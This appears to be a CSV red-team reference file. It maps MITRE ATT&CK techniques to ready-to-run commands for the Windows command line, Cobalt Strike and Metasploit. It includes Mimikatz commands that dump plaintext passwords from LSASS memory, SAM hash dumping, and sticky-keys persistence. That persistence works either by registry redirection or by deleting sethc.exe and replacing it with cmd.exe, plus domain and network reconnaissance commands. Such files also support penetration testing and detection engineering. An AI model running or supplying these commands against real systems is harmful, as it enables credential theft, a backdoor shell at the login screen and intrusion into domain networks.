Technique Name,Framework,Description,Implementation,Techniques
Dump credentials from LSASS,cobalt-strike,"This technique injects into the LSASS.exe process and scrapes its memory for plaintext passwords of logged on users. You must do this from a high integrity process. 
The Mimikatz project has a lot of different capabilities (https://github.com/gentilkiwi/mimikatz/wiki) such as pass-the-hash, pass-the-ticket, creating silver/golden tickets, dumping credentials, and elevating a process.","logonpasswords
mimikatz !sekurlsa::logonpasswords
mimikatz !sekurlsa::msv
mimikatz !sekurlsa::kerberos
mimikatz !sekurlsa::wdigest",T1003
Dump credentials from LSASS,metasploit,"This technique injects into the LSASS.exe process and scrapes its memory for plaintext passwords of logged on users. You must do this from a high integrity process. 
The Mimikatz project has a lot of different capabilities (https://github.com/gentilkiwi/mimikatz/wiki) such as pass-the-hash, pass-the-ticket, creating silver/golden tickets, dumping credentials, and elevating a process.","use mimikatz
wdigest
msv
kerberos
logonpasswords",T1003
Dumps hashes from the SAM Hive file,cobalt-strike,Dumps hashes from the SAM Hive file.,"hashdump
mimikatz !lsadump::sam",T1003
Dumps hashes from the SAM Hive file,metasploit,Dumps hashes from the SAM Hive file.,"hashdump
run hashdump
run smart_hashdump
post/windows/gather/credentials/domain_hashdump",T1003
Check terminal services,builtin,"Check for the current registry value for terminal services, if it's 0, then terminal services are enabled. If it's 1, then they're disabled","reg query ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections",T1012
Check terminal services,cobalt-strike,"Check for the current registry value for terminal services, if it's 0, then terminal services are enabled. If it's 1, then they're disabled","shell reg query ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections",T1012
Check terminal services,metasploit,"Check for the current registry value for terminal services, if it's 0, then terminal services are enabled. If it's 1, then they're disabled","reg queryval -k ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"" -v fDenyTSConnections
post/windows/gather/enum_termserv",T1012
Point sethc.exe file to cmd.exe,builtin,Modify the registry to point the sethc.exe file to point to cmd.exe,"Sticky Keys Persistence via Registry Manipulations:
REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"" /v Debugger /t REG_SZ /d ""C:\windows\system32\cmd.exe"" /f",T1015
Point sethc.exe file to cmd.exe,cobalt-strike,Modify the registry to point the sethc.exe file to point to cmd.exe,"Sticky Keys Persistence via Registry Manipulations:
shell REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"" /v Debugger /t REG_SZ /d ""C:\windows\system32\cmd.exe"" /f",T1015
Point sethc.exe file to cmd.exe,metasploit,Modify the registry to point the sethc.exe file to point to cmd.exe,post/windows/manage/sticky_keys,T1015
Replace real sethc.exe with a copy of cmd.exe,builtin,Remove the real sethc.exe and replace it with a copy of cmd.exe. You can also just move the original sethc.exe to a different file if you don't want to delete it,"Sticky Keys Persistence via binary swapping:
takeown.exe C:\Windows\system32\sethc.exe
del C:\Windows\system32\sethc.exe
copy C:\Windows\system32\cmd.exe C:\Windows\system32\sethc.exe",T1015
Replace real sethc.exe with a copy of cmd.exe,cobalt-strike,Remove the real sethc.exe and replace it with a copy of cmd.exe. You can also just move the original sethc.exe to a different file if you don't want to delete it,"Sticky Keys Persistence via binary swapping:
shell takeown.exe C:\Windows\system32\sethc.exe
shell del C:\Windows\system32\sethc.exe
shell copy C:\Windows\system32\cmd.exe C:\Windows\system32\sethc.exe",T1015
Get network information,builtin,"Get information about the domain, network adapters, DNS / WSUS servers",ipconfig /all,T1016
Get network information,cobalt-strike,"Get information about the domain, network adapters, DNS / WSUS servers",shell ipconfig,T1016
Get network information,metasploit,"Get information about the domain, network adapters, DNS / WSUS servers","ipconfig
post/windows/gather/enum_domains",T1016
Get ARP table,builtin,Display the ARP table,"arp -a
route print",T1016
Get ARP table,cobalt-strike,Display the ARP table,shell arp -a,T1016
Get ARP table,metasploit,Display the ARP table,route,T1016
"Dump MAC, IP addresses and codes",builtin,Used to get the MAC and IP addresses as well as some descriptive codes for machines (0x1C indicates a domain controller),nbtstat -a {IP | COMP_NAME },T1016
"Dump MAC, IP addresses and codes",cobalt-strike,Used to get the MAC and IP addresses as well as some descriptive codes for machines (0x1C indicates a domain controller),shell c:\windows\sysnative\nbstat.exe -a {IP | COMP_NAME},T1016
Get the list of domain computers,builtin,Display the list of domain computers in the domain by showing their computer accounts (COMP_NAME$),"net group ""Domain Computers"" /domain[:DOMAIN]",T1018
Get the list of domain computers,cobalt-strike,Display the list of domain computers in the domain by showing their computer accounts (COMP_NAME$),"net group ""Domain Computers"" /domain",T1018
Get the list of domain computers,metasploit,Display the list of domain computers in the domain by showing their computer accounts (COMP_NAME$),"
post/windows/gather/enum_ad_computers
post/windows/gather/enum_computers",T1018
Get the list of domain controllers,builtin,Display the list of domain controllers in the network,"net group ""Domain Controllers"" /domain[:DOMAIN]",T1018
Get the list of domain controllers,cobalt-strike,Display the list of domain controllers in the network,"net group ""Domain Controllers"" /domain",T1018
Display trust relationship with domain controller,builtin,Display the trust relationship between the workstation and the domain - must be elevated to use this!,nltest /dclist[:domain],T1018
Display the login server,builtin,Display the active directory login server of the workstation,echo %LOGONSERVER%,T1018
Display the login server,cobalt-strike,Display the active directory login server of the workstation,shell echo %LOGONSERVER%,T1018
Get user information,builtin,"Get current user information, SID, domain, groups the user belongs to, security privs of the user",whoami /all /fo list,T1033
Get user information,cobalt-strike,"Get current user information, SID, domain, groups the user belongs to, security privs of the user",shell whoami /all /fo list,T1033
Get user information,metasploit,"Get current user information, SID, domain, groups the user belongs to, security privs of the user",getuid,T1033
